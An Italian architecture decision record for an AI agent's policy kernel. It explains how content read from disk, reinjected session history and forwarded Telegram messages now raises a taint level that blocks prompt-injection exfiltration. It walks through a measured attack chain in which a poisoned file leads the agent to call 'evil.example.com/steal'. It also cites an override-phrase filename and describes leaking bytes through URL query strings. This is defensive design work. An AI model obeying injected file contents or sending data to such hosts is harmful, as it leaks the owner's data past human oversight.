# ADR-0044 — Il disco non ha provenienza: leggere un file sporca il turno

**Stato:** accettato · 2026-08-15 · chiude la domanda negativa lasciata aperta da
`validazione-contratti.md` §5 («il tier di un file su disco», VAGA) · **apre una
riga di decisione owner**, in fondo

## Contesto

`agent/loop.ts` alzava il taint del turno in un punto solo, e quel punto leggeva
un campo opzionale:

```ts
if (outcome.tier !== undefined) snapshot.raiseTaint(outcome.tier);
```

Dichiaravano un `tier` in uscita `http.ts` (3), `search.ts` (3), `mcp.ts` (3),
`skill.ts` (1), `memory.ts` (il max dei ricordi richiamati). **Non lo
dichiaravano** `fs.ts` (`fs_read`, `fs_list`), `shell.ts` (`shell_run`),
`process.ts` (`process_list`, `process_kill`) — cioè tutti i percorsi che portano
nel turno byte scritti da qualcun altro sul disco di casa.

Conseguenza: leggere un file non alzava il taint di un millimetro.

**Perché è più grave della somma dei suoi pezzi.** Il docstring di `fs.read`
argomentava il proprio soffitto alto (3) appoggiandosi esplicitamente all'egress:
*«il read da solo non è la fuga: i byte devono comunque uscire, e la gamba di
egress è gattata a parte — fuori allowlist sopra taint 1 è DENY, mai ask, proprio
perché un contesto avvelenato non possa nominare la destinazione»*. Quel cancello
(`core/policy/decide.ts`) legge **il taint del turno**. Se leggere un file non lo
alza, il turno resta a 0 e il cancello non scatta mai: **l'argomento di sicurezza
scritto nel file dipendeva da una proprietà che il file stesso non produceva.**

Catena misurata su `dev` @ a3754c4, con il test che oggi sta in
`agent/read-then-egress.test.ts`: `fs_read nota.md` (contiene istruzioni
iniettate) → taint 0 → `http_get https://evil.example.com/steal`, host fuori
allowlist → il kernel risponde `ask` → l'owner approva → **il fetch parte**.

E `validazione-contratti.md:102` marcava **VERIFICATA** l'affermazione «un tool
result tier-3 alza il taint». È vera. Nessuno aveva fatto la domanda negativa —
*che cosa entra senza tier?* — che è dove stava tutto.

Non è la prima volta. `agent/tools/skill.ts:97-110` è il verbale della volta
precedente: quel file dichiarava `tier: 1` nel proprio docstring, non lo
restituiva, e ci sono voluti mesi perché qualcuno se ne accorgesse. **Un'omissione
che significa «pulito» è invisibile da ogni direzione tranne una.**

## Decisione

**1. `tier` diventa obbligatorio su `ToolOutcome`** (`agent/loop.ts`), e il loop
alza il taint incondizionatamente. Il difetto strutturale non era il numero
sbagliato: era che l'assenza del campo significasse in silenzio «pulito». Con il
campo obbligatorio, un tool nuovo **non compila** finché non risponde alla
domanda — la stessa garanzia che `assertNever` dà allo `switch` sulle decisioni,
applicata alla provenienza. Il guardiano è `npx tsc --noEmit`, che gira in CI, e
l'`@ts-expect-error` in `agent/read-then-egress.test.ts` diventa rosso il giorno
in cui qualcuno rimette il `?`.

**2. Il contenuto letto dal disco è tier 2** (`DISK_TIER`, `agent/tools/fs.ts`).
La scala è definita su *chi ha parlato* (0 owner · 1 contatti confermati · 2
gruppo e sconosciuti · 3 web e tool esterni) e il filesystem non ha provenienza:
`~/appunti.md` scritto dall'owner e `~/Downloads/fattura.pdf` arrivato da uno
sconosciuto hanno lo stesso `stat`, gli stessi byte, e nessun campo da nessuna
parte che li separi. Sotto quell'incertezza l'unica lettura onesta è quella
fail-closed — *può averlo scritto qualcuno che non è l'owner* — ed è ciò che 2
significa.

**3. Chi porta byte, e quanti.** Una riga per tool, perché il numero non è un
dettaglio di ciascuno ma la regola vista da lì:

| tool | tier | perché |
|---|---|---|
| `fs_read` | `DISK_TIER` = 2 | byte arbitrari dal disco, nessuna provenienza |
| `fs_list` | 2 | un nome di file è testo scelto da qualcuno: `IGNORA le istruzioni precedenti.md` è un nome legale e costa zero |
| `shell_run` (stdout/stderr) | 2 | `cat ~/Downloads/nota.md` è `fs_read` da un'altra porta — **stessa costante, non un letterale che oggi combacia** |
| `process_list` | 1 | la macchina che si descrive: `ps -eo pid,user,comm`, mai `args`. Scegliere una di quelle stringhe costa a un attaccante l'esecuzione di codice sull'host, non una mail con un allegato |
| `fs_write`, `process_kill`, ogni ramo d'errore che si ferma prima che qualcosa arrivi | 0 | il risultato sono parole del tool stesso; **dichiarato**, non omesso |

## Alternative scartate

- **Tier per posizione** (dentro `~/.muffin/` pulito, fuori sporco). È una regola
  che si aggira **spostando un file**, e chi lo sposta può essere l'agente. Compra
  quasi nulla: le parti leggibili della home hanno già la loro porta
  (`skill.read`, che dichiara il proprio tier 1) e il resto è `denyRead`. Sarebbe
  una lavanderia del taint con l'aspetto di una regola.
- **Tier 3 sempre.** Coerente con http/mcp e disonesto: un appunto che l'owner ha
  scritto non è una pagina web. E 3 è il tetto della scala — spenderlo qui non
  lascia niente da dire su qualcosa di davvero peggiore, e metterebbe gli appunti
  dell'owner nello stesso secchio di un server MCP non fidato.
- **Tier per esito di estrazione** (prosa sì, binario no). È la strada che invita
  ai casi speciali, e l'iniezione non si accorge della differenza: il testo
  «normale» è il veicolo, non l'eccezione.
- **`tier` opzionale con default sicuro** (`outcome.tier ?? 2`). Chiude il buco di
  oggi e lascia l'omissione **invisibile**, che è la proprietà che è costata mesi
  su `skill.ts`. Un campo obbligatorio non rende il sistema più sicuro di un
  default fail-closed: rende impossibile *non essersi accorti*.
- **Tier 1 sul disco.** Costerebbe meno e non chiuderebbe niente: a taint 1 un
  host fuori allowlist torna comunque `ask` (`decide.ts:184`), quindi il file
  avvelenato può ancora nominare la destinazione e aspettare un sì stanco. La
  catena si chiude a 2 e da nessuna parte sotto.

## Cosa costa

Misurato eseguendo il kernel vero sulle dichiarazioni vere (single-user, owner,
allowlist con un host):

| capability | soffitto | taint 0 | taint 2 (dopo una lettura) |
|---|---|---|---|
| `fs.read` · `fs.list` | 3 | allow | **allow** |
| `memory.read` · `sys.search` · `sys.http` (su allowlist) | 3 | allow | **allow** |
| `sys.http` **fuori** allowlist | 3 | ask | **deny/resource_denied** ← la catena |
| `sys.shell` | 1 | ask | **deny/taint_exceeded** |
| `skill.read` | 1 | allow | **deny/taint_exceeded** |
| `sys.process.list` | 1 | allow | **deny/taint_exceeded** |
| `sys.process.kill` | 1 | ask | **deny/taint_exceeded** |
| `mcp.<server>` | 1 | allow | **deny/taint_exceeded** |
| `fs.write` | 1 | draft¹ | deny/taint_exceeded |

¹ `fs.write` è `medium`+`undoable`, quindi il kernel risponde `draft` e il loop
lo rifiuta già oggi («il registro di undo non esiste ancora»): su questa riga la
decisione non costa nulla, perché non c'era niente da perdere.

**Detto in italiano: un turno che ha letto dal disco diventa un turno che legge e
risponde, e non agisce più sull'host.** *«Leggi il file e poi lancia i test»*
oggi si spezza a metà — e questo è esattamente ciò che la riga «Shell /
filesystem host / processi · taint 2 · **DENY — nessun percorso**» di
`03-threat-model.md` §3 dice che deve succedere a un contesto che ha ingoiato
byte non fidati. Il costo è reale, non è un effetto collaterale: è la regola.

## Cosa NON copre

- **Il contenuto letto non è delimitato.** `http`, `search`, `mcp` e `memory`
  avvolgono il risultato in `fence()`; `fs_read` no. Il taint difende il
  *kernel*, lo spotlighting difende il *modello*, e questa ADR fa solo il primo.
  Slice sua.
- **Il taint muore con il turno**, per disegno (`03-threat-model.md` §2: lo scope
  è il turno, non la sessione). Un file letto ieri non sporca oggi. È deliberato
  e va saputo.
- **La replica dell'agente entra in memoria a `trustTier: 0`** anche quando il
  turno era a 2: `agent/loop.ts:633-642` scrive un letterale, non il taint del
  turno. È la regola di `03:22` — *«qualunque testo derivato porta il tier
  massimo delle proprie fonti»* — non applicata al percorso di scrittura, quindi
  un file avvelenato **riassunto** dall'agente può rientrare domani come fatto
  tier 0. Trovata mentre si scriveva questa ADR, non chiusa qui: è un'altra
  gamba, con un altro test.
- **Il confine di lettura resta la working directory**, non un sandbox. La
  decisione owner aperta in `LAVORO.md` («scope lettura sandbox») non è chiusa da
  qui: questa ADR dice *quanto sporca ciò che leggi*, non *cosa puoi leggere*.
- **`process_kill` e `fs_write` a tier 0 sono un'affermazione sulle stringhe che
  quei tool costruiscono**, non sull'effetto: sono write, e la loro pericolosità
  è governata dalla classe di rischio, non dalla provenienza.

## La riga che l'owner deve poter contraddire

> **Dopo un `fs_read`, `shell_run` nello stesso turno è `deny/taint_exceeded`, e
> lo è anche il secondo `shell_run` di fila.** Non un `ask`: un rifiuto.

È la conseguenza che tocca l'uso quotidiano più di ogni altra, e anticipa la
decisione owner ancora aperta su `shell_run`. **Non la decido io.** Se la
risposta è no, la contropartita non è togliere il tier alla lettura — sarebbe
riaprire la catena — ma **`maxTaint: 2` su `sys.shell`**, che lascia shell un ASK
(l'auto-allow richiede taint 0 e resta irraggiungibile) e lascia l'egress chiuso.
Quella mossa **emenda `03-threat-model.md` §3**, riga «Shell / filesystem host /
processi · taint 2 · DENY — nessun percorso», e un emendamento al threat model è
un atto, non un default ammorbidito di passaggio. Il costo è misurato in
`agent/tools/shell.test.ts` §«il costo, dichiarato come test», così che allargarlo
richieda di avere quel test nel diff.

## Reversibilità

Alta sul numero, bassa sulla forma, ed è la divisione giusta. `DISK_TIER` è una
costante con due chiamanti: cambiarla è una riga e tre test che si aggiornano.
`tier` obbligatorio invece è la parte che non conviene togliere — toglierlo non
riporta un comportamento, riporta l'ignoranza.

Segnali che era sbagliata: se l'owner scopre che i turni utili si spezzano più
spesso di quanto la catena valga, il numero da rivedere è il **soffitto delle
capability che agiscono**, non il tier della lettura — cioè la riga qui sopra,
che è il motivo per cui è scritta a parte e chiede un sì.

## Revisione — 2026-08-16

**Decisione owner sulla riga sopra: la contropartita.** Dopo un `fs_read`,
`shell_run` nello stesso turno torna `ask`, non più `deny/taint_exceeded`.
`sys.shell` dichiara ora `maxTaint: 2` (`agent/tools/shell.ts`), il numero che
questa ADR aveva già nominato come contropartita se la risposta fosse stata no.
**Non è una riscrittura della decisione sopra** — il tier di lettura resta 2,
`DISK_TIER` resta 2, la catena read-then-egress resta chiusa esattamente come
misurata: questa riga tocca solo il soffitto di `sys.shell`, la capability che
*agisce*, non quella che *legge*.

**La ragione, con le parole dell'owner:** l'agente diventa inutilizzabile se
*«leggi il file e poi lancia i test»* si spezza a metà. Un rifiuto silenzioso a
metà di un compito quotidiano costa più, in uso reale, di quanto valga la
differenza fra "rifiutato" e "chiesto e approvato" — e un `ask` che l'owner può
dire no altrettanto quanto sì non riapre nessuna delle due gambe che questa ADR
chiude: l'auto-allow del kernel richiede `taint === 0` (`core/policy/
decide.ts`), che un turno che ha letto qualcosa non raggiunge mai a `maxTaint:
2` tanto quanto a `maxTaint: 1`, e l'egress fuori allowlist resta `deny` sopra
taint 1 esattamente come prima — quella riga non è toccata da questo
emendamento.

**Cosa cambia, misurato:**

| | prima di questa revisione | dopo |
|---|---|---|
| `sys.shell` a taint 0 (owner, hardened) | allow | allow (invariato) |
| `sys.shell` dopo un `fs_read` (taint 2) | **deny/taint_exceeded** | **ask** |
| `sys.shell` a taint 3 (web/search/mcp) | deny/taint_exceeded | deny/taint_exceeded (invariato) |
| `sys.http` fuori allowlist, taint ≥2 | deny/resource_denied | deny/resource_denied (invariato) |

**Cablaggio.** `agent/tools/shell.ts` (`shellCapability.maxTaint = 2`, con la
ragione in un commento). Test aggiornati per asserire il nuovo costo, non solo
per non fallire: `agent/tools/shell.test.ts` §«il costo, stated as a test» ora
verifica `ask` a taint 2 e `deny/taint_exceeded` a taint 3 — invariato solo nel
metodo (un test nel diff prima di poter allargare di nuovo il soffitto), non nel
verdetto atteso. `agent/read-then-egress.test.ts` §«the price of the same rule»
misura la stessa cosa attraverso un turno vero: `shell_run` dopo `fs_read` ora
gira una volta che l'owner approva l'`ask`, e resta un rifiuto secco solo a
taint 3. `03-threat-model.md` §3 emendata in riga, sulla stessa riga citata qui
sopra, con la data e il riferimento a questa sezione.

**Cosa NON copre questa revisione (dichiarato, non nascosto).** L'`ask` che il
kernel produce oggi porta solo `capability` + `prompt` + una `resource` se di
tipo `path` (`ApprovalRequest`, `agent/loop.ts`): il comando che `shell_run`
sta per eseguire, l'URL che `sys.http` sta per raggiungere, il pid che
`process_kill` sta per segnalare non compaiono nel testo che l'owner vede prima
di dire sì. Un `ask` che non mostra *cosa* sta approvando è un consenso più
debole di quanto sembri — e con questa revisione `sys.shell` torna a passare per
quel canale più spesso, non meno. Non chiuso qui: è nominato come lavoro
immediatamente successivo, non lasciato per essere ritrovato una terza volta.

## Emendamento — 2026-08-17 (`slice/egress-params`, mandato inv. 7)

**Il difetto che questa revisione chiude: il kernel guardava solo l'host, non i
byte.** L'audit del 16/08 (P04-1/P04-2) e il triage del 17/08 (proprietà
trasversale 6) hanno trovato la stessa forma di buco che questa ADR aveva già
chiuso una volta per la lettura, riaperta sul lato dell'uscita: il ramo
`resourceKind === 'url'` di `decide.ts` verificava l'**hostname** di un `sys.http`
contro l'allowlist e poi lasciava passare tutto il resto dell'URL — query
string, fragment — senza guardarlo. Un turno che aveva letto byte a tier ≥ 2
poteva quindi costruire `http_get` verso un host allowlisted con quei byte
incollati nel path o nella query, e il kernel approvava: l'argomento di
sicurezza di `fs.ts` («il read da solo non è la fuga: la gamba di egress è
gattata a parte») dipendeva da una proprietà che il ramo url non forniva.
`sys.search` era peggio: dichiarava `resourceKind: 'none'`, quindi non entrava
**mai** nel ramo egress, a nessun taint — l'unica difesa era l'endpoint
verificato una volta alla registrazione, che risponde a una domanda diversa
("questa destinazione è fidata") da quella che conta turno per turno ("questi
byte li ha appena scelti un contesto avvelenato?").

**La correzione, nella stessa primitiva.** `core/policy/decide.ts` guadagna
`gateParams(principal, taint, ceiling, prompt)`, chiamata da due punti:

1. Nel ramo `url`, **dopo** che l'host ha già superato l'allowlist: se l'URL
   porta una query string o un fragment non vuoti (`hasParams`), i byte
   rispondono a `gateParams` esattamente come l'host aveva già risposto
   all'allowlist. Il path non è incluso — l'allowlist odierna (`rot/egress.json`)
   non ha granularità di path, quindi non esiste ancora un «oltre il path
   consentito» da confrontare; dichiarato qui, non taciuto.
2. `sys.search` guadagna un nuovo `ResourceKind`, `'query'` (`core/policy/
   types.ts`): non un riuso di `'url'`, perché il testo di una query non è un
   URL e non ha un host su cui il kernel possa far leva — l'unica cosa su cui
   il kernel *può* decidere è il taint del turno. `search.ts` dichiara ora
   `resourceKind: 'query'` al posto di `'none'` (il `policyArgs: ['query']`
   c'era già, ma era inerte); `resourceFor` (`agent/loop.ts`) lo solleva dagli
   argomenti come già faceva per `url`/`path`, stessa funzione, guardia più
   larga.

**La soglia è la stessa forma di `sys.shell`, e il perché è lo stesso.** Sopra
`paramsMaxTaint` (**default 2**, decisione owner 2026-08-17), l'owner viene **chiesto** e vede i byte per
intero (`prompt` li contiene già; `ApprovalRequest.resource` ora li porta anche
strutturati — vedi sotto); ogni altro principal è **rifiutato**, sempre, mai un
`ask`. È la stessa mossa di questa ADR §revisione 2026-08-16 per `sys.shell
dopo un fs_read`: un turno che ha letto qualcosa non deve smettere di
funzionare, ma non deve nemmeno poter *scegliere ed approvare da solo* la
propria via d'uscita — quindi ask per l'owner (che può dire no tanto quanto sì),
mai auto-allow, mai per chiunque altro. La tabella si legge come quella di
allora:

| | sotto la soglia | sopra la soglia |
|---|---|---|
| `http_get`, host allowlisted, **senza** parametri | allow (invariato) | allow (invariato) |
| `http_get`, host allowlisted, **con** parametri, owner | allow | **ask**, mostra l'URL intero |
| `http_get`, host allowlisted, **con** parametri, chiunque altro | allow | **deny/resource_denied** |
| `sys.search`, owner | allow | **ask**, mostra la query |
| `sys.search`, chiunque altro (già escluso da `hostOnly`) | deny/principal_forbidden | deny/principal_forbidden |

**`paramsMaxTaint` vive dove vivono le altre soglie — con una differenza
dichiarata.** Come `defaultMaxTaint`, è un campo di `rot/policy.json` letto da
`core/policy/matrix.ts`; a differenza di `defaultMaxTaint`, il file sigillato
può **alzarlo**, non solo abbassarlo (`merge()` lo legge diretto, senza il
clamp `tighter()`). Non è una svista sulla regola di confinamento monotono
(ADR-0013): `defaultMaxTaint` è ereditato da ogni capability che non fissa un
proprio `maxTaint`, quindi un numero allargato in un file risigillato allenta
capability mai riviste per quello (la misura su `mcp.*` nel docstring di
`matrix.ts`); `paramsMaxTaint` ha esattamente le due chiamate sopra, e alzarlo
non concede niente a nessuno tranne l'owner — sposta solo il taint a cui
l'owner comincia a essere chiesto, mai verso un auto-allow. Il floor spedito è
**2**, e la ragione è una distinzione di sostanza, non un compromesso
(decisione owner 2026-08-17): **tier 2 è il disco e i dati locali dell'owner**,
e chiedere per ogni ricerca che segue una lettura di file trasformerebbe l'ASK
in un riflesso da liquidare — il modo esatto in cui un cancello di sicurezza
smette di essere letto (mandato §D12). **Tier 3 è il mondo esterno** (web,
risultati di ricerca, MCP, contenuto inoltrato): è lì che i byte scelti dal
modello smettono di essere parole dell'owner. Il knob resta nel Root of Trust e
resta modificabile in `rot/policy.json` + `muffin rot reseal`, senza toccare il
codice; e a qualunque valore, **un principal non-owner è rifiutato, mai
chiesto**.

**Chiude in parte il gap che la revisione del 16/08 aveva lasciato scritto qui
sopra.** `ApprovalRequest.resource` (`agent/loop.ts`) portava il valore della
risorsa solo per `resource.kind === 'path'`; ora lo porta anche per `'url'` e
`'query'`, quindi un `ask` per `http_get` o `sys.search` mostra il byte esatto
che l'owner sta per approvare, non solo la frase del kernel. **Non chiude
D12**: `sys.shell` (comando+cwd) e `process_kill` (pid+nome) dichiarano ancora
`resourceKind: 'none'` e restano senza niente da mostrare in quel campo — resta
lavoro di `slice/ask-dice-cosa`, non toccato qui.

**Cablaggio, mutato prima di scriverlo qui.** Rosso-prima verificato: `core/
policy/decide.test.ts` (branch `params gate`, 11 casi) e `core/policy/
matrix.test.ts` (`paramsMaxTaint`, 4 casi) contro il kernel puro;
`agent/read-then-egress.test.ts` estende la stessa catena vera (`runTurn` +
`resourceFor` + `decide` + i tool di produzione) con `http_get` con parametri
su host allowlisted e `web_search` dietro `makeSearchTool`; `evals/acceptance/
scenarios/d-capability.accept.ts` aggiunge `D6`/`D7` contro il binario reale
(`muffin run --json`), verificando che l'`ask` non wired si fermi *prima* di
`tool.handler` — nessun fetch, nessuna chiamata verso Tavily. Mutazione
verificata a mano su tutti e tre i livelli: rimettere `resourceKind: 'none'` in
`search.ts` fa cadere `decide.test.ts`, `read-then-egress.test.ts` **e** lo
scenario `D7` (`stopped: 'answered'` al posto di `ask`).

## Revisione — 2026-08-17: la history non lava la provenienza

**La domanda negativa di questa ADR era "che tier ha un file", e restava aperta
la stessa domanda posta a un secondo canale.** Il probe del triage
(`docs/blueprint/research/triage-2026-08-17/e-audit-trasversali.md` §3.1,
MANDATO-DAY-1 invariante 2) l'ha confutata in senso negativo: turno 1 (owner)
chiama un tool tier 3 e risponde con testo derivato — taint persistita 3,
corretta. Turno 2, **stessa sessione**, nessuna tool call, testo pulito — taint
persistita **0**, mentre la risposta del turno 1 era fisicamente presente nella
richiesta che il turno 2 ha mandato al modello. Verdetto del probe: **LAUNDERED**.

Il meccanismo era lo stesso di §Contesto sopra, spostato di un file:
`agent/loop.ts` alzava la taint nei punti dove il turno legge qualcosa da fuori
di sé — recall, il piano — e non nel punto dove legge la propria sessione.
`buildContext` chiamava `deps.sessions.read(input.session)` e reiniettava i
messaggi `user`/`assistant` passati **come testo puro**, senza `raiseTaint`.
`SessionMessage` (`core/session/store.ts`) non aveva un campo tier:
l'informazione era persa nel momento stesso in cui la risposta veniva scritta
nella sessione.

### Decisione

**1. La proprietà** (MANDATO-DAY-1 invariante 2, verbatim): *"qualunque byte
fisicamente presente nel nuovo context conserva il massimo trust tier delle
fonti da cui deriva. Una sessione/transcript non è una lavanderia del taint."*
Una sessione che ha letto tier 3 resta a taint 3 finché quel testo — o testo
derivato da esso — è nella finestra reiniettata. Non finché la sessione esiste:
finché il contenuto è fisicamente nella richiesta.

**2. `SessionMessage` guadagna `tier?: TrustTier`** (`core/session/store.ts`),
additivo — JSONL retro-compatibile, nessuna riga vecchia riscritta, come ogni
altro campo di questo file. Scritto da `agent/loop.ts` a ognuno dei tre
`sessions.append`: `user` → 0, o 2 se `principal.kind === 'member'` (la stessa
regola dell'init di `runTurn`/`enqueueTurn`, applicata al messaggio invece che
al turno); `assistant` → `snapshot.currentTaint()` nell'istante dell'append,
mai un letterale — lo stesso argomento di 03 §2 già applicato all'episodio di
memoria in `reply-taint.test.ts` ("un riassunto di contenuto tier-3 è tier-3,
sempre"), qui applicato alla riga di sessione che quell'episodio non è;
`tool` → `outcome.tier`, anche se `buildContext` oggi non reinietta mai un
messaggio `tool` come history (filtra a `user`/`assistant`), scritto comunque
perché un campo omesso è esattamente l'errore che questa ADR esiste per non
ripetere una terza volta.

**3. Le righe vecchie, senza `tier`, si risolvono da `traceId` →
`turns.taint`** (`TurnStore.taintForIds`, una query per l'insieme dei
`traceId` reiniettati — mai una per riga: una sessione lunga può passarne
decine in un colpo solo a `agent/context/history-taint.ts`). `turns.id` è lo
stesso valore di `traceId` per costruzione (`NewTurn.id`'s docstring: "one
identity, so 'why' is a join") — non serve una tabella nuova, la riga del
turno che ha scritto quel messaggio esiste già.

**4. Fail-closed, dichiarato invece di indovinato, per una riga senza
nessuna delle due fonti.** `user` → 0: questo store tiene la sessione di un
solo tenant, e una riga `user` vecchia è per costruzione le parole
dell'owner (o della regola `member`, mai un byte che il turno ha letto altrove).
`assistant`/`tool` → il tetto della scala (3), non `DISK_TIER` (2): il dubbio
alza e non abbassa (la stessa regola con cui questa ADR ha già scartato
`tier?` con default sicuro, §"Alternative scartate" sopra), e una riga
`assistant`/`tool` senza `tier` **e** senza `traceId` risolvibile non ha
nemmeno il pavimento che un file su disco ha — `stat` non distingue le note
dell'owner da un allegato di uno sconosciuto, ma almeno è un file *di
qualcuno sul disco di casa*; una riga di sessione senza provenienza non ha
neanche quello. `DISK_TIER` resta la risposta giusta per un file; questa riga
prende il tetto della scala, non la sua metà.

**5. Il punto d'alzata è lo stesso di recall e todo, nello stesso ordine.**
`agent/loop.ts`, dentro `drive`, subito dopo `snapshot.raiseTaint(planTaint(open))`
e prima che `buildContext` costruisca i messaggi: si legge la sessione, si
taglia alla finestra che `buildContext` renderizzerà davvero
(`reinjectedHistory`, `agent/context/history-taint.ts` — la stessa funzione
che `buildContext` usa per renderizzare, non una seconda copia del taglio che
potrebbe disallinearsi), si calcola il tier massimo (`historyTaint`) e si alza
la snapshot — tutto prima che il kernel decida qualunque cosa in quel turno.
Il commento già in `agent/loop.ts` sul piano ("`raiseTaint` before the rows
reach the transcript") vale parola per parola anche qui.

**6. La proprietà è sul contenuto reiniettato, non sulla storia intera.** Un
messaggio tier 3 abbastanza vecchio da uscire dalla finestra
(`MAX_HISTORY_TURNS`, oggi 40 turni parlati) non alza la taint del turno nuovo:
non è fisicamente nella richiesta, quindi non può contaminarla. Questo è
deliberato e testato (`agent/session-history-taint.test.ts`, scenario "(d)"),
non un buco lasciato aperto — la via per tornare a qualcosa fuori dalla
finestra resta memoria/recall, esattamente come l'avviso che `buildContext`
già stampa quando taglia ("`cercalo in memoria invece di indovinare`").

### Cosa costa, misurato

| scenario | prima | dopo |
|---|---|---|
| turno pulito, sessione mai tainted | taint 0 | taint 0 (invariato) |
| turno pulito, sessione con una risposta derivata da tool tier 3 | **taint 0** | **taint 3** |
| stesso turno, `http_get` fuori allowlist come sua prima azione | ask (l'owner poteva approvarlo) | **deny/resource_denied** |
| sessione vecchia, riga `assistant` con `traceId` di un turno a taint 2, nessun `tier` | taint 0 | taint 2 |
| sessione vecchia, riga `assistant` senza `tier` né `traceId` | taint 0 | taint 3 (fail-closed) |
| messaggio tier 3 tagliato fuori da `MAX_HISTORY_TURNS` | taint 0 | taint 0 (invariato — §Decisione 6) |
| sessione già a taint 3, turno successivo pulito | taint 0 | taint 3 — **e il cricchetto**: vedi sotto |

Riga due e tre sono la stessa catena read-then-egress di questa ADR, questa
volta attraverso un confine di processo: `evals/acceptance/scenarios/
d-capability.accept.ts` (D10, esteso) lo misura con due `muffin run --session
<stessa>` separati contro il binario vero, non con `runTurn` e dipendenze
sostituite a mano.

### Test rosso-prima e mutazione

`agent/session-history-taint.test.ts` riscrive il probe come test permanente,
con `SessionStore`/`TurnStore` reali su directory temporanee e un provider
finto — cinque `it`, sui quattro scenari (a)-(d) sopra (due su (a): il valore
di taint, e la decisione del kernel sulla prima azione del turno). Scritti e
fatti girare **prima** del cablaggio: quattro rossi con lo stesso sintomo del
probe (`expected +0 to be 3`, o l'equivalente sull'egress non negato); (d) già
verde, perché prima di questa revisione niente alzava la taint dalla history,
quindi "non alzarla per un messaggio tagliato" era vero per il motivo
sbagliato. Dopo il cablaggio: cinque su cinque verdi.

Mutazione (`docs/JUDGE.md`): commentata la riga
`snapshot.raiseTaint(historyTaint(spoken.kept, taintByTrace))`, rilanciati i
test — (a) (entrambe le asserzioni), (b) e (c) tornano rossi, (d) resta verde
per costruzione (l'assenza dell'alzata non può *aggiungere* taint). Confermato
anche sullo scenario D10 esteso, attraverso il binario reale: con la riga
commentata il secondo turno risultava a `taint: 0` — e il primo tentativo di
misurarlo aveva un difetto proprio, corretto durante questa stessa revisione:
la query del secondo turno condivideva la parola "tutto" con l'episodio di
memoria piantato dal turno 1, quindi il recall automatico (corretto,
indipendente da questa modifica) trovava comunque quell'episodio e alzava la
taint per conto suo — un falso verde che avrebbe dichiarato provata una
proprietà che il test non isolava. La query è stata cambiata per non
condividere nessuna parola con l'episodio piantato né con il testo del primo
turno, e solo allora la mutazione ha fatto fallire l'assert nel punto giusto.
Ripristinata la riga, cinque su cinque verdi di nuovo.

### Cosa NON copre questa revisione

- **La taint fa cricchetto, e la finestra si pulisce più tardi di quanto sembri**
  (trovato dal judge di questa slice, 2026-08-17). Ogni risposta scritta mentre
  la sessione è a 3 viene registrata essa stessa `tier: 3` (`agent/loop.ts`, il
  `tier` dell'`assistant` è `currentTaint()`): quindi la finestra torna pulita
  `MAX_HISTORY_TURNS` messaggi dopo **l'ultima risposta sporca**, non dopo la
  lettura che aveva alzato la taint. È corretto — quella risposta *è* derivata
  dal contenuto tier 3 — ma è più lungo di quanto un lettore assuma, e va detto
  qui invece di essere scoperto durante i quattordici giorni.
- **Il rimedio è una sessione nuova, e non tutte le superfici sanno aprirne
  una.** La CLI ha `--session <id>`: una sessione nuova è un id nuovo, sempre
  stata così. Telegram non ha equivalente: `connectors/telegram/connector.ts`
  deriva l'id sessione deterministicamente da `telegram:<chatId>`, per sempre,
  e non ha nessun comando (`/nuova`, `/reset` o simile) per cambiarlo — verificato
  leggendo il connector per intero, nessun handling di comandi slash esiste
  affatto. Un owner che ha fatto leggere qualcosa di tier 3 su Telegram non ha
  un modo di ripulire la conversazione da lì: deve saperlo e non può farlo
  dalla superficie su cui si trova. Gap dichiarato, non chiuso qui — non è
  nel mandato di questa slice (`slice/session-taint`) e tocca la superficie
  Telegram, non la taint.
- **Il confine resta il turno che *reinietta*, non il turno che ha letto.**
  Come già scritto sopra (§"Cosa NON copre" originale): la taint muore con il
  turno per disegno. Questa revisione non cambia quel confine — allarga solo
  la definizione di "cosa è fisicamente nel turno nuovo" a ciò che la sessione
  reinietta, che prima non contava affatto.
- **Lo spotlighting resta fuori.** Come `fs_read`, il testo della history
  reiniettata non è delimitato da `fence()` — questa ADR fa il taint, non la
  difesa del modello dall'istruzione iniettata nel testo stesso. Stessa nota
  già scritta sopra, stessa slice futura.

## Emendamento — 2026-08-18 (`slice/ingress-forward`, B16 minimo, audit P14)

**La terza faccia dello stesso invariante.** Questa ADR aveva già chiuso "che
tier ha un file letto dal disco" (§Contesto) e "che tier ha la history
reiniettata" (§Revisione 17/08 sopra). Restava aperta la stessa domanda su un
terzo canale: l'ingresso di un connector. `connectors/telegram/connector.ts`
`parseUpdate` faceva `const text = message.text ?? message.caption` e non
leggeva affatto `forward_origin`: un messaggio che l'owner **inoltra** da uno
sconosciuto entrava a tier 0, byte-identico alle parole scritte dall'owner in
quella chat — da lì poteva alzare fiducia ed entrare in memoria come evidenza
sua. Stessa famiglia: `caption` fusa in `text` come se il mittente l'avesse
scritta come riga separata, e il `filename` dell'allegato — scelto da chi
manda, mai dal destinatario — concatenato come testo libero in almeno un
percorso (`ingest`, ramo "vault non configurato").

**L'ingresso ha campi, non un testo: chi non ha scritto non è l'owner.** Nel
minimo di B16 (`M5-BIS.md`, PC 1.4, non l'envelope universale):

1. `forward_origin` presente (Bot API 9.x: sostituisce `forward_from`/
   `forward_sender_name`, assenti dal tipo `Update` corrente — verificato su
   `@grammyjs/types`) ⇒ il contenuto (testo o caption) entra a `FORWARD_TIER =
   2` (`connectors/telegram/connector.ts`) — lo stesso numero concettuale di
   `DISK_TIER` sopra: la scala è su *chi ha parlato*, e un forward consegna le
   parole di qualcun altro attraverso un account senza che quell'account le
   abbia dette. Non 3: resta un messaggio che il mittente ha scelto di
   portare *in questa chat*, la stessa distinzione che questa ADR traccia già
   fra un file sul disco di casa e una fetch aperta sul web.
2. `caption` e `filename` restano campi distinti da `text`, sempre tipizzati e
   sempre recintati con `fence()` (`core/memory/spotlight.ts`, riuso —non un
   secondo meccanismo: la stessa funzione che #61 usa già per descrizioni MCP
   e risultati web) — anche quando il messaggio **non** è inoltrato: sono
   metadata scelti attraverso un'interfaccia diversa dalla riga di
   conversazione (un file picker, non la tastiera del messaggio), quindi non
   sono mai equivalenti a prosa digitata lì.
3. Un messaggio normale dell'owner (niente forward, niente allegato) resta
   tier 0 e **non** recintato — provato in negativo: recintare ogni messaggio
   sarebbe la regressione contro cui ADR-0046 §2 mette già in guardia.
4. Il tier del turno parte dal **massimo** fra il tier del principal e il
   content-taint misurato dal connector: `TurnInput.contentTaint?: TrustTier`
   (`agent/loop.ts`), campo nuovo e opzionale che ogni chiamante diverso da
   Telegram lascia assente. `initialTaint(input)` è la sola formula, e
   sostituisce quattro copie separate del vecchio `principal.kind ===
   'member' ? 2 : 0` (`enqueueTurn`, `runTurn`, la scrittura dell'episodio,
